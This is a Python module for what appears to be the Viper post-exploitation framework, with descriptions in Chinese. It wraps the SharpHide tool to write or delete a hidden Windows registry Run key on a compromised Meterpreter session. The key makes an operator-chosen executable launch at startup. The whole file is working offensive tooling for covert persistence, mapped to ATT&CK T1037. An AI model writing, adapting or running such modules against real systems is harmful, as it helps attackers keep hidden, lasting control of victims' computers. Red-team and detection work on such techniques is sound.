# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :

from Lib.ModuleAPI import *


class PostModule(PostMSFCSharpModule):
    NAME_ZH = "Windows注册表Run键值持久化(C#)"
    DESC_ZH = "模块通过调用SharpHide写入隐藏的注册表键值,实现持久化.\n" \
              "SharpHide会将目标exe路径写入到注册表Run键值中.\n"
    MODULETYPE = TAG2TYPE.Persistence
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1037"]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/npl2d8"]
    REFERENCES = ["https://github.com/outflanknl/SharpHide"]
    AUTHOR = "Viper"

    OPTIONS = register_options([
        OptionEnum(name='action', name_tag="执行动作", required=True,
                   desc="针对键值的执行的命令",
                   enum_list=[
                       {'name': "创建", 'value': "create"},
                       {'name': "删除", 'value': "delete"},
                   ],
                   option_length=6),
        OptionStr(name='keyvalue', name_tag="可执行文件目录", required=True,
                  desc="输入开启启动的exe文件路径.",
                  option_length=18),
        OptionStr(name='arguments', name_tag="命令行参数", required=False,
                  desc="执行exe是的命令行参数",
                  option_length=24),

    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)

    def check(self):
        """执行前的检查函数"""
        session = Session(self._sessionid)
        if session.is_windows is not True:
            return False, "此模块只支持Windows的Meterpreter"
        self.set_assembly("SharpHide")
        if self.param("action") == "delete":
            self.set_arguments("action=delete")
        else:
            param_keyvalue = self.param("keyvalue")
            arguments = f"action=create keyvalue='{param_keyvalue}'"

            param_arguments = self.param("arguments")
            if param_arguments is not None:
                arguments += f" arguments='{param_arguments}'"
            self.set_arguments(arguments)
        return True, None

    def callback(self, status, message, data):
        assembly_out = self.get_console_output(status, message, data)
        self.log_raw(assembly_out)
